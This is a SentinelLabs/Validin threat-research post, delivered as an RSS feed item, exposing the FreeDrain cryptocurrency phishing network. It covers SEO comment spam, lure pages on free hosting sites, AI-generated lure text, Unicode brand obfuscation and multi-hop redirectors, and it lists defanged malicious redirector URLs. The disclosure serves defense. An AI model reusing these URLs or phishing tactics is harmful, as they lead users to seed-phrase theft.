<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>SentinelLabs - We are hunters, reversers, exploit developers, and tinkerers shedding light on the world of malware, exploits, APTs, and cybercrime across all platforms.</title>
	<atom:link href="https://www.sentinelone.com/labs/feed/" rel="self" type="application/rss+xml" />
	<link>https://www.sentinelone.com/labs/</link>
	<description>Next Generation Endpoint Security</description>
	<lastBuildDate>Wed, 07 May 2025 21:24:16 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	
	<item>
		<title>FreeDrain Unmasked &#124; Uncovering an Industrial-Scale Crypto Theft Network</title>
		<link>https://www.sentinelone.com/labs/freedrain-unmasked-uncovering-an-industrial-scale-crypto-theft-network/</link>
		
		<dc:creator><![CDATA[Tom Hegel, Kenneth Kinion (Validin) &amp; Sreekar Madabushi (Validin)]]></dc:creator>
		<pubDate>Thu, 08 May 2025 13:55:29 +0000</pubDate>
				<category><![CDATA[Crypto]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=121002</guid>

					<description><![CDATA[FreeDrain is a modern, scalable phishing operation exploiting weaknesses in free publishing platforms to steal cryptocurrency on a global scale.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">FreeDrain is an industrial-scale, global cryptocurrency phishing operation that has been stealing digital assets for years.</li>
<li aria-level="1">FreeDrain uses SEO manipulation, free-tier web services (like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>), and layered redirection techniques to target cryptocurrency wallets.</li>
<li aria-level="1">Victims search for wallet-related queries, click on high-ranking malicious results, land on lure pages, and are redirected to phishing pages that steal their seed phrases.</li>
<li aria-level="1">SentinelLABS and Validin researchers identified over 38,000 distinct FreeDrain subdomains hosting lure pages.</li>
<li aria-level="1">Phishing pages are hosted on cloud infrastructure like Amazon S3 and Azure Web Apps, mimicking legitimate cryptocurrency wallet interfaces.</li>
<li aria-level="1">Evidence suggests the operators are based in the UTC+05:30 timezone (Indian Standard Time) and work standard weekday hours.</li>
<li aria-level="1">FreeDrain represents a modern, scalable phishing operation that exploits weaknesses in free publishing platforms and requires better platform-level defenses, user education, and security community collaboration.</li>
</ul>
<p>Unveiled today at <a href="https://pivotcon.org/agenda-2025/" target="_blank" rel="noopener noreferrer">PIVOTcon</a>, this joint research from <a href="https://www.validin.com/blog/freedrain_unmasked/" target="_blank" rel="noopener noreferrer">Validin</a>, the global internet intelligence platform, and <a href="https://s1.ai/FreeDrain" target="_blank" rel="noopener noreferrer">SentinelLABS</a>, the threat intelligence and research team of SentinelOne, exposes the FreeDrain Network: a sprawling, industrial-scale cryptocurrency phishing operation that has quietly siphoned digital assets for years. What began as an investigation into a single phishing page quickly uncovered a vast, coordinated campaign weaponizing search engine optimization, free-tier web services, and layered redirection techniques to systematically target and drain cryptocurrency wallets at scale.</p>
<p>In this collaborative blog, we detail the technical anatomy of the FreeDrain operation from the discovery process and infrastructure mapping to evasion techniques and the end-to-end workflow attackers use to funnel victims through multilayered financial theft paths. We also walk through the custom tooling we built to hunt, track, and monitor this large campaign in real time.</p>
<p>Our findings highlight the growing sophistication of financially motivated threat actors and the systemic risks posed by under-moderated publishing platforms. This research underscores the need for adaptive detection, proactive monitoring, and tighter safeguards across the ecosystem to disrupt threats like FreeDrain before they scale.</p>
<h2>The Plea for Help</h2>
<p>Our investigation into what would become the <i>FreeDrain</i> Network began on May 12, 2024, when Validin received a message from a distressed individual who had lost approximately 8 BTC, worth around $500,000 at the time. The victim had unknowingly submitted their wallet seed phrase to a phishing site while attempting to check their wallet balance, after clicking on a highly-ranked search engine result.</p>
<figure id="attachment_121004" aria-describedby="caption-attachment-121004" style="width: 1007px" class="wp-caption aligncenter"><img fetchpriority="high" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg" alt="Request for help after successful phish" width="1007" height="333" class="size-full wp-image-121004" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg 1007w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-768x254.jpg 768w" sizes="(max-width: 1007px) 100vw, 1007px" /><figcaption id="caption-attachment-121004" class="wp-caption-text">Request for help after successful phish</figcaption></figure>
<p>The individual had come across a Validin blog post from April 2024, <a href="https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/" target="_blank" rel="noopener noreferrer">which documented a series of crypto-draining phishing pages</a>. The phishing site they encountered shared striking similarities to the infrastructure we had analyzed—specifically, pages hosted on <code>azurewebsites[.]net</code>, along with additional dedicated domain names.</p>
<p>Trusted cryptocurrency tracking analysts confirmed that the destination wallet used to receive the victim’s funds was a one-time-use address. The stolen assets were quickly moved through a cryptocurrency mixer, an obfuscation method that fragments and launders funds across multiple transactions, making attribution and recovery nearly impossible.</p>
<p>While we weren’t able to assist in recovering the lost assets, this outreach marked a turning point. It became clear that the incident was not isolated. We set out to uncover the infrastructure behind the scam and understand the broader operation enabling these thefts to occur at scale.</p>
<h2>Cracking the Surface – Our First Look at FreeDrain</h2>
<p>When Valdin published the <a href="https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/" target="_blank" rel="noopener noreferrer">initial findings in April 2024</a>, one key piece of the puzzle remained unclear: how were these phishing pages reaching victims at scale? While common delivery methods like phishing emails, SMS (smishing), social media posts, and blog comment spam are frequently used in cryptocurrency scams, none appeared to be the source in this case.</p>
<p>That changed with the report from the victim in May. They had encountered the phishing site via a top-ranked search engine result, not a suspicious message or unsolicited link.</p>
<p>Curious whether we could reproduce the victim’s experience, we conducted a series of keyword searches ourselves. The results were startling.</p>
<p>Search terms like &#8220;<i>Trezor wallet balance</i>&#8221; returned multiple malicious results across Google, Bing, and DuckDuckGo, often within the first few result pages.</p>
<p><figure id="attachment_121024" aria-describedby="caption-attachment-121024" style="width: 1504px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg" alt="Trezor Wallet Balance malicious result in DuckDuckGo" width="1504" height="1131" class="size-full wp-image-121024" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg 1504w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-1024x770.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-768x578.jpg 768w" sizes="(max-width: 1504px) 100vw, 1504px" /><figcaption id="caption-attachment-121024" class="wp-caption-text">Trezor Wallet Balance malicious result in DuckDuckGo</figcaption></figure><br />
<figure id="attachment_121010" aria-describedby="caption-attachment-121010" style="width: 1498px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg" alt="Trezor Wallet Balance malicious result in top Bing Search" width="1498" height="1130" class="size-full wp-image-121010" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg 1498w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-768x579.jpg 768w" sizes="(max-width: 1498px) 100vw, 1498px" /><figcaption id="caption-attachment-121010" class="wp-caption-text">Trezor Wallet Balance malicious result in top Bing Search</figcaption></figure><br />
<figure id="attachment_121007" aria-describedby="caption-attachment-121007" style="width: 1142px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg" alt="Trezor Wallet Balance malicious result in Top Google Search result" width="1142" height="774" class="size-full wp-image-121007" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg 1142w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-300x203.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-1024x694.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-768x521.jpg 768w" sizes="auto, (max-width: 1142px) 100vw, 1142px" /><figcaption id="caption-attachment-121007" class="wp-caption-text">Trezor Wallet Balance malicious result in Top Google Search result</figcaption></figure></p>
<p>These were not obscure or poorly maintained phishing sites; they were professionally crafted lure pages freely hosted on subdomains of trusted platforms like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>.</p>
<p>This discovery marked our first real glimpse into the scale and sophistication of the FreeDrain campaign—and raised a host of new questions. Specifically, what is the overall workflow once a victim visits the site, how are these pages becoming so highly ranked, and what can we discover about the attackers themselves?</p>
<h2>Workflow &#8211; A Victim’s Path to Compromise</h2>
<p>To understand how victims were being funneled into this operation and the post-visit workflow, we checked out the top-ranked search results that we knew weren’t connected to authoritative, legitimate websites, looking for malicious behavior. Within minutes, we encountered related live phishing pages, and quickly began piecing together the end-to-end workflow that a typical victim might experience.</p>
<p>The attack chain was deceptively simple:</p>
<ol>
<li aria-level="1"><b>Search for wallet-related queries</b> (e.g., &#8220;Trezor wallet balance&#8221;) on a major search engine.</li>
<li aria-level="1"><b>Click a high-ranking result</b>, often hosted on a seemingly trustworthy platform like <code>gitbook.io</code> or <code>webflow.io</code>.</li>
<li aria-level="1"><b>Land on a page displaying a large, clickable image</b>, a static screenshot of the legitimate wallet interface.</li>
<li aria-level="1"><b>Click the image</b>, which either:
<ul>
<li aria-level="2">Redirects the user to legitimate websites.</li>
<li aria-level="2">Redirects the user through one or more intermediary sites</li>
<li aria-level="2">Directly leads to a phishing page.</li>
</ul>
</li>
<li aria-level="1"><b>Arrive at the final phishing site</b>, a near-perfect clone of the real wallet service, prompting the user to input their seed phrase.</li>
</ol>
<figure id="attachment_121268" aria-describedby="caption-attachment-121268" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1.jpg" alt="Attack chain summary" width="1999" height="1215" class="size-full wp-image-121268" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-300x182.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-1024x622.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-768x467.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-1536x934.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121268" class="wp-caption-text">Attack chain summary</figcaption></figure>
<p>The entire flow is frictionless by design, blending SEO manipulation, familiar visual elements, and platform trust to lull victims into a false sense of legitimacy. And once a seed phrase is submitted, the attacker’s automated infrastructure will drain funds within minutes.</p>
<p><figure id="attachment_121009" aria-describedby="caption-attachment-121009" style="width: 1438px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4.jpg" alt="Lure page linking to phishing page" width="1438" height="1041" class="magnify size-full wp-image-121009" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4.jpg 1438w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-300x217.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-1024x741.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-768x556.jpg 768w" sizes="auto, (max-width: 1438px) 100vw, 1438px" /><figcaption id="caption-attachment-121009" class="wp-caption-text">Lure page linking to phishing page</figcaption></figure><br />
<figure id="attachment_121015" aria-describedby="caption-attachment-121015" style="width: 1440px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21.jpg" alt="Redirect to legitimate site" width="1440" height="1041" class="magnify size-full wp-image-121015" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21.jpg 1440w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-300x217.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-1024x740.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-768x555.jpg 768w" sizes="auto, (max-width: 1440px) 100vw, 1440px" /><figcaption id="caption-attachment-121015" class="wp-caption-text">Redirect to legitimate site</figcaption></figure></p>
<h2>Lure Page Ranking &#8211; Weaponizing SEO</h2>
<p>We were stunned by the sheer volume of lure pages appearing among top-ranked search results across all major search engines. These weren’t complex, multi-layered scams. In most cases, the pages consisted of just a single large image (again, usually a screenshot of a legitimate crypto wallet interface) followed by a few lines of text that offered seemingly helpful instructions, ironically, some even claimed to educate users on how to avoid phishing.</p>
<p>This type of simplistic, Q&amp;A-style content is well-known in SEO circles for being rewarded by search engine algorithms. Because users often turn to search engines for direct answers, pages that appear to offer guidance, even when malicious, can be algorithmically elevated in rankings, especially when hosted on high-reputation platforms.</p>
<p>In our early investigation (May–June 2024), we found that many of these lure pages were hosted on services like <code>webflow.io</code> and <code>gitbook.io</code>. Both platforms provide low-friction publishing, enabling anyone to spin up a custom subdomain and publish arbitrary content for free. The subdomains used followed familiar spammer patterns, frequent use of hyphens, deliberate misspellings, and keyword stuffing to manufacture variation and dodge blacklisting.</p>
<figure id="attachment_121012" aria-describedby="caption-attachment-121012" style="width: 717px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg" alt="Subdomain naming scheme similarities" width="717" height="426" class="size-full wp-image-121012" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg 717w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24-300x178.jpg 300w" sizes="auto, (max-width: 717px) 100vw, 717px" /><figcaption id="caption-attachment-121012" class="wp-caption-text">Subdomain naming scheme similarities</figcaption></figure>
<h3>Generative AI as a Tool for Scale</h3>
<p>The text on many lure pages bore clear signs of having been generated by large language models. We found copy-paste artifacts that revealed the specific tools used, most notably, strings like &#8220;4o mini&#8221;, a likely reference to OpenAI’s GPT-4o mini model. These telltale traces suggest that FreeDrain operators are leveraging generative AI not only to create scalable content but doing so carelessly at times.</p>
<figure id="attachment_121027" aria-describedby="caption-attachment-121027" style="width: 1239px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg" alt="Fake content mistakenly including OpenAI GPT-4o mini reference" width="1239" height="775" class="size-full wp-image-121027" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg 1239w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-300x188.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-1024x641.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-768x480.jpg 768w" sizes="auto, (max-width: 1239px) 100vw, 1239px" /><figcaption id="caption-attachment-121027" class="wp-caption-text">Fake content mistakenly including OpenAI GPT-4o mini reference</figcaption></figure>
<h3>FreeDrain’s Secret Weapon &#8211; Spamdexing</h3>
<p>But content alone doesn&#8217;t explain how these pages were getting indexed and ranked above legitimate sources. How were search engines even discovering them?</p>
<p>The answer came when we identified several indexed URLs pointing back to high-ranking lure pages, and traced them to massive comment spam campaigns. FreeDrain operators appear to be heavily abusing neglected web properties that allow open or weakly-moderated comments, flooding them with links pointing to their lure pages. This old tactic, known as <a href="https://blog.sucuri.net/2023/06/spamdexing-what-is-seo-spam.html" target="_blank" rel="noopener noreferrer">spamdexing</a>, is a well-documented SEO abuse technique, which FreeDrain makes heavy use of as <a href="https://www.sentinelone.com/blog/breaking-down-the-seo-poisoning-attack-how-attackers-are-hijacking-search-results/" target="_blank" rel="noopener noreferrer">one of the ways to</a> attempt to game SEO.</p>
<p>In one striking example, we found a Korean university photo album page with a single image uploaded over a decade ago, buried under 26,000 comments, nearly all of them containing spam links.</p>
<figure id="attachment_121026" aria-describedby="caption-attachment-121026" style="width: 1023px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg" alt="FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing" width="1023" height="776" class="size-full wp-image-121026" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg 1023w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-300x228.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-768x583.jpg 768w" sizes="auto, (max-width: 1023px) 100vw, 1023px" /><figcaption id="caption-attachment-121026" class="wp-caption-text">FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing</figcaption></figure>
<p>This technique allows FreeDrain to sidestep traditional delivery vectors like phishing emails or malicious ads, instead meeting victims exactly where they’re looking, at the top of trusted search engines.</p>
<h2>Tracking Search Results</h2>
<p>Understanding how FreeDrain&#8217;s lure pages consistently climbed to the top of search results became a key investigative goal, and it demanded custom tooling.</p>
<p>We built a purpose-specific crawler designed solely to emulate search engine queries, navigate through pages of search results, and extract structured data from each result: URLs, page titles, and text content summaries. The goal was to systematically monitor how malicious pages were ranking, shifting, and proliferating over time.</p>
<p>We ran this system daily across 700 unique keyword permutations, capturing up to 40 pages deep per search query, per search engine. This daily monitoring provided a dynamic, longitudinal view into the visibility of FreeDrain’s infrastructure.</p>
<h3>The Scale of Abuse</h3>
<p>After four months of collection, we amassed a dataset of more than 200,000 unique URLs, drawn from topical search results across at least a dozen different publishing platforms that allow users to create custom subdomains. Aggressively filtering, we identified over 38,000 distinct FreeDrain subdomains hosting the lure pages.</p>
<p>These subdomains appeared on well-known free hosting and publishing platforms, including:</p>
<ul>
<li aria-level="1">Gitbook (gitbook.io)</li>
<li aria-level="1">Webflow (webflow.io)</li>
<li aria-level="1">Teachable (teachable.com)</li>
<li aria-level="1">Github.io</li>
<li aria-level="1">Strikingly (mystrikingly.com)</li>
<li aria-level="1">WordPress.com</li>
<li aria-level="1">Weebly.com</li>
<li aria-level="1">GoDaddySites (godaddysites.com)</li>
<li aria-level="1">Educator Pages (educatorpages.com)</li>
<li aria-level="1">Webador (webador.com)</li>
</ul>
<figure id="attachment_121019" aria-describedby="caption-attachment-121019" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg" alt="Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity" width="1999" height="1180" class="size-full wp-image-121019" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121019" class="wp-caption-text">Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity</figcaption></figure>
<p>The volume and spread across legitimate platforms further highlights how FreeDrain relies on the low-friction, high-trust nature of these services to evade detection and amplify reach.</p>
<p>To go beyond static discovery, we implemented scheduled re-crawls of every suspected lure page. This allowed us to track:</p>
<ul>
<li aria-level="1">Content updates over time</li>
<li aria-level="1">Changes in redirect behavior</li>
<li aria-level="1">New final-stage phishing URLs being introduced</li>
<li aria-level="1">Takedowns and domain churn</li>
</ul>
<p>This gave us a clearer picture of FreeDrain&#8217;s infrastructure lifecycle, from initial lure page creation to eventual takedown or abandonment, which helped us understand the rotation strategies used to keep malicious links live and searchable.</p>
<h2>Lure Page Breakdown</h2>
<p>Despite being spread across a wide array of publishing platforms, FreeDrain lure pages followed a remarkably consistent structure, carefully optimized to appear helpful and legitimate, while subtly guiding victims toward compromise.</p>
<h3>Common Elements Observed Across Lure Pages</h3>
<p>Across <code>gitbook.io</code>, <code>webflow.io</code>, <code>github.io</code>, and others, the pages typically included:</p>
<ul>
<li aria-level="1">A single, large, clickable image occupying most of the viewport
<ul>
<li aria-level="2">This image was a screenshot of a legitimate cryptocurrency site (e.g., Trezor, Metamask, or Ledger)</li>
<li aria-level="2">The image linked externally, usually to a malicious redirection chain</li>
</ul>
</li>
<li aria-level="1">AI-generated help content positioned below the image
<ul>
<li aria-level="2">The text answered common user queries like <i>&#8220;How do I check my wallet balance on Trezor?&#8221;</i></li>
</ul>
</li>
<li aria-level="1">1–2 additional embedded links, which pointed to the same external destination as the image or were placeholders like <code>"#"</code></li>
</ul>
<h3>Link Behavior: Redirection Variability</h3>
<p>Clicking the image or associated links triggered unpredictable outcomes, depending on the time, user agent, or page freshness:</p>
<ul>
<li aria-level="1">Redirection through one or more intermediary domains (typically 1–5 hops)</li>
<li aria-level="1">Final destinations varied widely:
<ul>
<li aria-level="2">A phishing page built to capture wallet seed phrases (hosted on Azure or AWS S3)</li>
<li aria-level="2">A legitimate site like trezor.io or metamask.io, creating false reassurance</li>
<li aria-level="2">A non-functional domain (404 or NXDOMAIN)</li>
<li aria-level="2">The current page itself (<code>"#"</code>) acting as a placeholder when infrastructure wasn’t active</li>
</ul>
</li>
</ul>
<p>This redirection behavior made classification challenging, especially since not every page led directly to a phishing endpoint in every instance.We observed that lure pages initially hosted benign content before being modified to include malicious redirects usually weeks or months later. This aging tactic likely helped the sites build trust and survive longer before being flagged or removed.</p>
<figure id="attachment_121028" aria-describedby="caption-attachment-121028" style="width: 1224px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg" alt="A Github lure page that has just been changed from benign to malicious" width="1224" height="793" class="size-full wp-image-121028" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg 1224w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-300x194.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-1024x663.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-768x498.jpg 768w" sizes="auto, (max-width: 1224px) 100vw, 1224px" /><figcaption id="caption-attachment-121028" class="wp-caption-text">A Github lure page that has just been changed from benign to malicious</figcaption></figure>
<h3>Obfuscation Through Variation</h3>
<p>Identifying FreeDrain lure pages at scale proved difficult due to extreme variation in phrasing, metadata, and platform-specific formatting. For example, we identified 46 unique renderings of the word &#8220;Trezor&#8221;, all visually similar, using tricks like added Unicode characters, zero-width spaces, and mixed script alphabets.</p>
<p><figure id="attachment_121023" aria-describedby="caption-attachment-121023" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14.jpg" alt="Trezor variation heatmap by quantity" width="1999" height="1179" class="size-full wp-image-121023" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-1536x906.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121023" class="wp-caption-text">Trezor variation heatmap by quantity</figcaption></figure><br />
Demonstrating the variations in tooling use, we found that FreeDrain pages on github\.io were usually copies of the generated content from services like Mobrise Website Builder and Webflow.</p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20.jpg" alt="" width="1194" height="170" class="aligncenter size-full wp-image-121016" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20.jpg 1194w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-300x43.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-1024x146.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-768x109.jpg 768w" sizes="auto, (max-width: 1194px) 100vw, 1194px" /><br />
<figure id="attachment_121017" aria-describedby="caption-attachment-121017" style="width: 1203px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2.jpg" alt="Snippets of pages hosted on github\.io with content clearly generated using other tools, for example, “Mobrise Website Builder”" width="1203" height="169" class="size-full wp-image-121017" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2.jpg 1203w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-300x42.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-1024x144.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-768x108.jpg 768w" sizes="auto, (max-width: 1203px) 100vw, 1203px" /><figcaption id="caption-attachment-121017" class="wp-caption-text">Snippets of pages hosted on github\.io with content clearly generated using other tools, for example, “Mobrise Website Builder”</figcaption></figure></p>
<p>A turning point in connecting these fragmented domains came from pivoting off the redirection infrastructure. While the lure content varied, the redirectors often remained consistent across pages and platforms.</p>
<figure id="attachment_121005" aria-describedby="caption-attachment-121005" style="width: 1240px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8.jpg" alt="Validin result showing redirector abusing free services" width="1240" height="380" class="size-full wp-image-121005" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8.jpg 1240w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-300x92.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-1024x314.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-768x235.jpg 768w" sizes="auto, (max-width: 1240px) 100vw, 1240px" /><figcaption id="caption-attachment-121005" class="wp-caption-text">Validin result showing redirector abusing free services</figcaption></figure>
<p>By tracing traffic from anchor links to known FreeDrain redirectors, we were able to map common ownership and activity across otherwise-unrelated services. This infrastructure-based pivot became essential for clustering and attribution, bridging gaps that the lure content itself couldn&#8217;t.</p>
<h2>Redirectors</h2>
<p>Pivoting on URLs from known and suspected FreeDrain lure pages that we were monitoring, we quickly noticed some noteworthy patterns in the FreeDrain redirection domains.</p>
<h3>Domain Characteristics</h3>
<p>Nearly all redirector domains shared several features:</p>
<ul>
<li aria-level="1">.com TLDs exclusively</li>
<li aria-level="1">Names that appeared algorithmically generated, likely via a Domain Generation Algorithm (DGA) or Markov chain model</li>
<li aria-level="1">English-adjacent structure, visually familiar but never forming real English words</li>
</ul>
<p>Examples include:</p>
<ul>
<li aria-level="1">antressmirestos[.]com</li>
<li aria-level="1">shotheatsgnovel[.]com</li>
<li aria-level="1">bildherrywation[.]com</li>
</ul>
<p>Each URL also included a GUID-like string in the path, which may have served as a session ID, traffic source identifier, or logic gate for redirection behavior. Examples:</p>
<ul>
<li aria-level="1">https://causesconighty[.]com/ce405b14-337a-43a5-9007-ed1aaf807998</li>
<li aria-level="1">https://causesconighty[.]com/d7c95729-6eed-452a-b246-865e0d97fc23</li>
<li aria-level="1">https://disantumcomptions[.]com/61e7fc9c-baef-43f0-82bf-a7f12a025586</li>
<li aria-level="1">https://disantumcomptions[.]com/6c31ec3b-0d4b-4bf4-a9f4-91453c4ef99e</li>
<li aria-level="1">https://distrypromited[.]com/d7c95729-6eed-452a-b246-865e0d97fc23</li>
<li aria-level="1">https://distrypromited[.]com/ff933705-9619-4292-9e22-02269acc197b</li>
<li aria-level="1">https://posectsinsive[.]com/9431711a-cf35-4ebd-b5db-eacba9ef7ee3</li>
<li aria-level="1">https://posectsinsive[.]com/994ffe2a-21fb-448a-b4e3-01b9483c5460</li>
</ul>
<p>(A complete list of FreeDrain-associated redirector domains is provided in the appendix.)</p>
<h3>Domain Registration and Infrastructure Clues</h3>
<p>All domains we identified were registered via Key-Systems GmbH, a registrar often used for bulk domain purchases and programmatic registration.</p>
<p>Initially, we suspected that these domains were all managed by the FreeDrain operators as well, but have since connected these domains to a much larger network of thousands domain names that are used to route traffic for many different purposes.</p>
<p>Looking at DNS history for some of the older redirectors on our list, we saw that they rotated IP addresses relatively infrequently, resolving to just a small number of IPs within a time window of weeks to months.</p>
